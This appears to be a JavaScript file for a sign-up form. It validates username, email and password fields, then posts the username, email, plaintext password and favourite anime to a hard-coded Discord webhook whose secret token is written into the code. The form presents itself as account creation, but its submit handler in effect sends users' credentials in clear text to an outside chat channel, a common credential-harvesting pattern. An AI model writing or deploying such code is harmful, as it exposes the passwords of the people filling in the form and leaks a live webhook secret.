const email = document.getElementById("email")
const username = document.getElementById("username")
const password = document.getElementById("pass");
const cnfrmpass = document.getElementById("cnfrmpass");
const fav = document.getElementById("fav")
const form = document.getElementById("user_input")

form.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const isValid = validateInputs();
    if (isValid) {
        fetchData();
    }
})

const setError = (element, message) => {
    const inputControl = element.parentElement;
    const errorDisplay = inputControl.querySelector('.error');

    errorDisplay.innerText = message;
    inputControl.classList.add('error');
    inputControl.classList.remove('success')
}

const setSuccess = element => {
    const inputControl = element.parentElement;
    const errorDisplay = inputControl.querySelector('.error');

    errorDisplay.innerText = '';
    inputControl.classList.add('success');
    inputControl.classList.remove('error');
    
};

const isValidEmail = email => {
  const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(String(email).toLowerCase());
}

const isValidUser = username => {
    const re = /^[a-zA-Z][a-zA-Z0-9_]{2,15}$/;
    return re.test(String(username).toLowerCase());
}

const validateInputs = () => {
    let isFormValid = true;

    const usernameValue = username.value.trim()
    const emailValue = email.value.trim()
    const passwordValue = password.value.trim()
    const cnfrmpassValue = cnfrmpass.value.trim()

    if (usernameValue === '') {
        setError(username, 'Username is required.')
        isFormValid = false;
    } else if (!isValidUser(usernameValue)) {
        setError(username, 'Invalid')
        isFormValid = false;
    } else {
        setSuccess(username);
    }

    if (emailValue === '') {
        setError(email, 'Email is required.')
        isFormValid = false;
    } else if (!isValidEmail(emailValue)) {
        setError(email, 'Please provide a valid email address.')
        isFormValid = false;
    } else {
        setSuccess(email)
    }

    if (passwordValue === '') {
        setError(password, 'Password is required.')
        isFormValid = false;
    } else if (passwordValue.length < 8 || passwordValue.length > 20) {
        setError(password, 'Password must be 8 to 20 character.')
        isFormValid = false;
    } else {
        setSuccess(password)
    }

    if (cnfrmpassValue === '') {
        setError(cnfrmpass, 'Confirm your password.')
        isFormValid = false;
    } else if (passwordValue !== cnfrmpassValue) {
        setError(cnfrmpass, `Password doesn't match`)
        isFormValid = false;
    } else {
        setSuccess(cnfrmpass)
    }

    return isFormValid;
}

const fetchData = () => {
    const formData = new FormData(form);
    const data = Object.fromEntries(formData);

    const content = {
        content: `**Account Created** \n\n**Username:** ${data.username} \n**Email:** ${data.email} \n**Password:** ${data.pass} \n**Fav Animes:** ${data.fav || 'None listed'}`
    }

    fetch('https://discord.com/api/webhooks/1515699510955868285/FOU8fGoc20vxiyotgxh-NWFwTvo-SCZ-HYU3oHmn-QfCNNQV4r8qNHAAcy_cCsFOMDoc', {
        method: 'post',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(content)
    })
}
